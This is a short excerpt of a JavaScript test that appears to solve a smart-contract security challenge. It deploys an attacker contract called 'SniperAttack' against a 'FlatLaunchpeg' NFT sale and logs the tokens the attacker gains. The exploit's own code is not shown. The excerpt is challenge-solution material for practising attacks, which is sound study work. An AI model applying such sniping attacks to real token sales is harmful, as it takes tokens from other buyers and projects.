...
it("solves the challenge", async function () {
  ...
  let sniperAttack = await (await ethers.getContractFactory("SniperAttack")).deploy(flatLaunchpeg.address)
  console.log("ATTACKER CONTRACT BALANCE:", String(await flatLaunchpeg.balanceOf(sniperAttack.address)))
  console.log("ATTACKER  BALANCE:", String(await flatLaunchpeg.balanceOf(attacker.getAddress())))
})
